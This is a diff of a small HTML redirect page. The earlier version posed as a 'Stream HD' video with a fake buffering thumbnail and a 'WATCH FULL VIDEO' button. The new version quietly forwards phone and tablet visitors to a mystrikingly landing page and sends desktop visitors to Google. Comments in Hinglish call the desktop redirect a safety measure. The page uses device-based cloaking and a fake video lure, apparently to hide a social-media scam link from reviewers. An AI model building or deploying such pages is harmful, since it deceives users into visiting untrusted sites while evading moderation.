@@ -3,26 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stream HD</title>
+    <title>Redirecting...</title>
     <script>
-        // LAPTOP BLOCKING: Agar koi Laptop/PC se khol raha hai toh Google bhej do
-        if (window.innerWidth > 768 || !/Android|iPhone|iPad/i.test(navigator.userAgent)) {
-            window.location.replace("https://www.google.com");
+        // Check if device is Touch Screen (Mobile/Tablet)
+        var isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+        
+        if (isTouchDevice) {
+            // AGAR MOBILE HAI: Toh seedha aapke landing page par bhej do
+            window.location.href = "https://muskan1.mystrikingly.com/";
+        } else {
+            // AGAR LAPTOP/PC HAI: Toh Google par bhej do (Safety ke liye)
+            window.location.href = "https://www.google.com";
         }
     </script>
-    <style>
-        body { background: #000; color: #fff; text-align: center; font-family: Arial, sans-serif; margin: 0; padding-top: 60px; }
-        .box { width: 90%; max-width: 400px; margin: auto; border: 1px solid #333; border-radius: 12px; padding: 15px; background: #0a0a0a; }
-        .thumb { width: 100%; border-radius: 8px; cursor: pointer; }
-        .btn { display: block; background: #e50914; color: #fff; text-decoration: none; padding: 15px; margin-top: 15px; border-radius: 6px; font-weight: bold; font-size: 1.2rem; }
-    </style>
 </head>
-<body>
-    <div class="box">
-        <a href="https://silver-mint-ss9kl5.mystrikingly.com/?fbclid=IwZXh0bgNhZW0CMTEAc3J0YwZhcHBfaWQPMjc1MjU0NjkyNTk4Mjc5AAEelyLGsFPCMAf6Z8sHUOYC1vss9QdCg9vLIafDcx2pPO7NrtcJ3vsYp5r5NFo_aem_l2Cwz36qF0iEnTCa_tuYDA">
-            <img src="https://via.placeholder.com/400x225.png?text=Buffering+Video...90%" class="thumb">
-            <div class="btn">WATCH FULL VIDEO</div>
-        </a>
-    </div>
+<body style="background: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial;">
+    <p>Loading... Please wait.</p>
 </body>
 </html>
+
